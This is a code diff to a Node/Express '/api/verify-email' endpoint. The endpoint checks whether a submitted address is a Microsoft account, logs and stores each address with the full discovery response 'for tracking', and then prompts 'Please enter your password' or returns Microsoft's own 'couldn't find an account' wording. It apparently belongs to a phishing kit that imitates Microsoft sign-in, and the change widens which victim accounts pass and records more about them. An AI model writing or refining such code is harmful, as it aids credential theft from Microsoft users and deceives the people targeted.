@@ -498,8 +498,20 @@ app.post('/api/verify-email', async (req, res) => {
                 const data = await response.json();
                 
                 // Check if the account exists and is a valid Microsoft account
-                if (data.Account && data.Account === 'Managed' || data.Account === 'Federated') {
-                    console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account})`);
+                // Microsoft accounts can have various AccountType values: Managed, Federated, Unknown, etc.
+                console.log(`Raw Microsoft discovery response for ${email}:`, data);
+                
+                const isValidAccount = data.Account && (
+                    data.Account === 'Managed' || 
+                    data.Account === 'Federated' || 
+                    data.NameSpaceType === 'Managed' ||
+                    data.NameSpaceType === 'Federated' ||
+                    (data.AuthURL && data.AuthURL.includes('login.microsoftonline.com')) ||
+                    (data.DomainName && data.DomainName.length > 0)
+                );
+                
+                if (isValidAccount) {
+                    console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account || data.NameSpaceType})`);
                     
                     // Store verification result in session_data for tracking
                     const fs = require('fs');
@@ -513,10 +525,11 @@ app.post('/api/verify-email', async (req, res) => {
                     const verificationData = {
                         id: verificationId,
                         email: email,
-                        accountType: data.Account,
+                        accountType: data.Account || data.NameSpaceType,
                         domain: domain,
                         timestamp: new Date().toISOString(),
-                        status: 'verified'
+                        status: 'verified',
+                        fullResponse: data
                     };
                     
                     fs.writeFileSync(
@@ -528,10 +541,11 @@ app.post('/api/verify-email', async (req, res) => {
                         exists: true,
                         email: email,
                         message: 'Account found. Please enter your password.',
-                        accountType: data.Account
+                        accountType: data.Account || data.NameSpaceType
                     });
                 } else {
                     console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
+                    console.log(`Discovery response:`, data);
                     
                     // Store invalid result
                     const fs = require('fs');
@@ -548,7 +562,8 @@ app.post('/api/verify-email', async (req, res) => {
                         reason: 'Account not found',
                         errorMessage: "We couldn't find an account with that username. Try another, or get a new Microsoft account.",
                         timestamp: new Date().toISOString(),
-                        status: 'invalid'
+                        status: 'invalid',
+                        fullResponse: data
                     };
                     
                     fs.writeFileSync(
